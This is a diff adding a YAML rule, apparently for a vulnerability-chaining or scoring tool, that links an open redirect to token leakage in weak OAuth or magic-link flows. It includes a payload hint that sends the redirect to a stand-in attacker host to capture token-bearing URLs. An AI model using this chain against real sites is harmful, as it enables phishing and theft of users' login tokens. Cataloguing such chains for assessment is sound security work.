@@ -1,0 +1,14 @@
+rules:
+  - from: open_redirect
+    to: info_disclosure
+    description: Use a trusted redirect endpoint to improve phishing credibility and collect leaked tokens.
+    chain_action: Abuse the redirect flow to capture token-bearing URLs during weak OAuth handling.
+    payload_hint: /redirect?next=https://attacker.example/capture
+    prerequisites:
+      - OAuth or magic-link flow includes tokens in URLs
+      - Redirect target is not strictly allowlisted
+    severity_bump: 2
+    confidence: 0.7
+    tags:
+      - oauth
+      - token-leak
